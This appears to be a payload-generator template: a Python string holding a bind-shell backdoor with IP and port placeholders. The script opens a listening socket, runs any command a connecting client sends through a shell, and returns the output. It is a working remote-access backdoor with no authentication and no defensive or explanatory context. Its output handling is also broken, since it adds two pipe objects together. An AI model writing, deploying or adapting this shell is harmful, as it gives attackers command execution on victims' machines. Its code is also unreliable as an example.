
code = '''
#!/usr/bin/python3

import socket, subprocess, sys, os, requests
def sock(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((host, port))
	s.listen(10)
	server(s)
def server(s):
	while True:
		conn, address = s.accept()
		#ip = requests.get('http://myexternalip.com/raw')
		name = subprocess.run("whoami", shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
		name = name.stdout
		path = os.getcwd()
		msg = "\033[97mConnected \033[92mSuccessfully\033[97m"
		conn.send(msg.encode('utf-8'))
		while True:
			data = conn.recv(4096)
			data = str(data.decode())
			data = subprocess.Popen(data, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
			data = data.stdout + data.stderr
			response = str(data)
			conn.send(response.encode('utf-8'))
		conn.close()
if __name__ == '__main__':
	sock("^IP^", int(^PORT^))'''
